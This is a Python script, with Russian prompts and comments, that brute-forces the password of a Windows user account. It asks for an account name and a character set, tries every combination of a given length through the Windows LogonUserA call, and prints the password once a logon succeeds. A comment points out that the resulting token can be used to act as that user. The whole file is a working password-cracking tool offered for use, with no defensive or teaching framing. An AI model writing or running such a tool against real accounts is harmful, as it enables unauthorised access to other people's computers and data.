import ctypes
import win32security
import win32api
import itertools
import string
import time


time_start = int(time.time())
# Определяем необходимые константы
LOGON32_LOGON_INTERACTIVE = 2
LOGON32_PROVIDER_DEFAULT = 0

# Указываем имя пользователя и пароль
account = str(input("Введите имя учетной записи: "))
username = account  # Замените на ваше имя пользователя

characters = string.digits

digits = str(input("Вы хотите использовать числа для подбора: ( Y/n ) "))
if digits == "Y" or digits =="y" or digits == "Д" or digits == "д":
    characters = string.digits

    ascii_letters = str(input("Вы хотите использовать буквы для подбора: ( Y/n ) "))

    if ascii_letters == "Y" or ascii_letters =="y" or ascii_letters == "Д" or ascii_letters == "д":
        characters = string.digits + string.ascii_letters

        punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))

        if punctuation == "Y" or punctuation =="y" or punctuation == "Д" or punctuation == "д":
            characters = string.digits + string.ascii_letters + string.punctuation

    else:
        print("ок if")
        punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))
        if punctuation == "Y" or punctuation =="y" or punctuation == "Д" or punctuation == "д":
            characters = string.digits + string.punctuation
        

else:
    print("Ок")

    ascii_letters = str(input("Вы хотите использовать буквы для подбора: ( Y/n ) "))
    if ascii_letters == "Y" or ascii_letters =="y" or ascii_letters == "Д" or ascii_letters == "д":
        characters = string.ascii_letters

        punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))
        
        if punctuation == "Y" or punctuation =="y" or punctuation == "Д" or punctuation == "д":
            characters = string.ascii_letters + string.punctuation
        else:
            print("Ок")
    else:
        print("Ок")
        punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))
        if punctuation == "Y" or punctuation =="y" or punctuation == "Д" or punctuation == "д":
            characters = string.punctuation
        else:
            print("Так как вы ничего не выбрали из вышеперечисленного, то по умолчанию выбран параметр перебора с помощью чисел")
    

    # characters =  string.digits + string.ascii_letters + string.punctuation

repeat = int(input("Сколько элементов в пароле: "))

try:
    for password in itertools.product(characters, repeat=repeat):
        
        password = "".join(password)

        # Попытка входа в систему
        token = ctypes.c_void_p()
        result = ctypes.windll.advapi32.LogonUserA(
            username.encode('utf-8'),
            None,  # Укажите домен, если необходимо
            password.encode('utf-8'),
            LOGON32_LOGON_INTERACTIVE,
            LOGON32_PROVIDER_DEFAULT,
            ctypes.byref(token)
        )

        if result:
            print("Вход выполнен успешно!", password)
            # Здесь вы можете использовать токен для выполнения действий от имени пользователя
            break
        else:
            print("Ошибка входа:", win32api.GetLastError(), password)
    
except Exception as ex:
    print(characters)

time_finish = int(time.time() - time_start)
print(f"{time_finish} секунд(ы)")

result = str(input("Нажмите для того чтобы консоль закрылась...."))